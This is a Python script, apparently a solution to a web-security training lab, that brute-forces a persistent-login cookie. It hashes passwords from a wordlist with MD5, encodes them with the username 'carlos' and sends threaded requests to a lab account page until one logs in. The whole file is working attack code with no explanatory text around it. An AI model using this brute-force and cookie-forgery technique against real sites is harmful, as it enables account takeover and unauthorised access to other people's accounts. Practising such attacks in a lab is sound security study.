#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep
from hashlib import md5
from base64 import b64encode

def fetchPassword(filename):
    listStayloggedinCookie = list()

    with open(filename) as fd:
        for line in fd:
            password = line.strip().encode('utf-8')
            MD5Hash = md5(password).hexdigest()
            base64Encoded = b64encode(f'carlos:{MD5Hash}'.encode('utf-8'))

            listStayloggedinCookie.append(base64Encoded)

    return listStayloggedinCookie

def sendRequest(url, cookieValue):
    cookie = {
        'session': 'h826pmhwmUE0tzA8p8tCgCh41CmBJTrU',
        'stay-logged-in': cookieValue
    }

    myaccountRequestText = requests.get(url, cookies=cookie).text

    if 'Log in' not in myaccountRequestText:
        print(f'[+] Found cookie: {cookieValue}')

def main():
    url = 'https://0a44005e040ea66b9c76e71c0010007f.web-security-academy.net/my-account'

    passwordFileName = './auth_password.txt'
    listStayloggedinCookie = fetchPassword(passwordFileName)

    for cookieValue in listStayloggedinCookie:
        thread = Thread(target=sendRequest, args=(url, cookieValue.decode('ascii')))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()